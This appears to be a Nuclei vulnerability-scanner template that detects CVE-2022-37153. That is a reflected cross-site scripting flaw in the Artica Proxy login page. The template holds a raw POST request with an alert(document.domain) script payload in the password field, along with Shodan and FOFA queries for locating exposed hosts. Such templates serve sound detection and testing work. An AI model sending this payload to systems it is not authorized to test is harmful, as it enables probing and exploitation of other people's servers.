http:
- matchers:
  - condition: and
    part: body
    type: word
    words:
    - Password" value="admin"><script>alert(document.domain)</script>
    - Artica Web
  - part: header
    type: word
    words:
    - text/html
  - status:
    - 200
    type: status
  matchers-condition: and
  raw:
  - 'POST /fw.login.php HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    userfont=&artica-language=&StandardDropDown=&HTMLTITLE=&username=admin&password=admin%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E

    '
id: CVE-2022-37153
info:
  author: arafatansari
  classification:
    cpe: cpe:2.3:a:articatech:artica_proxy:4.30.000000:*:*:*:*:*:*:*
    cve-id: CVE-2022-37153
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 6.1
    cwe-id: CWE-79
    epss-percentile: 0.87089
    epss-score: 0.03431
  description: 'Artica Proxy 4.30.000000 contains a cross-site scripting vulnerability
    via the password parameter in /fw.login.php.

    '
  impact: 'Attackers can inject malicious JavaScript through the password parameter
    in the Artica Proxy login page that reflects back to users, potentially stealing
    credentials or session tokens when victims submit the login form.

    '
  metadata:
    fofa-query: body="artica"
    max-request: 1
    product: artica_proxy
    shodan-query:
    - http.html:"Artica"
    - http.html:"artica"
    vendor: articatech
    verified: true
  name: Artica Proxy 4.30.000000 - Cross-Site Scripting
  reference:
  - https://github.com/Fjowel/CVE-2022-37153
  - https://nvd.nist.gov/vuln/detail/CVE-2022-37153
  - https://github.com/SYRTI/POC_to_review
  - https://github.com/WhooAmii/POC_to_review
  - https://github.com/k0mi-tg/CVE-POC
  remediation: 'Upgrade to a patched version of Artica Proxy or apply the vendor-supplied
    patch to mitigate the vulnerability.

    '
  severity: medium
  tags: cve,cve2022,xss,artica,articatech,vkev,vuln
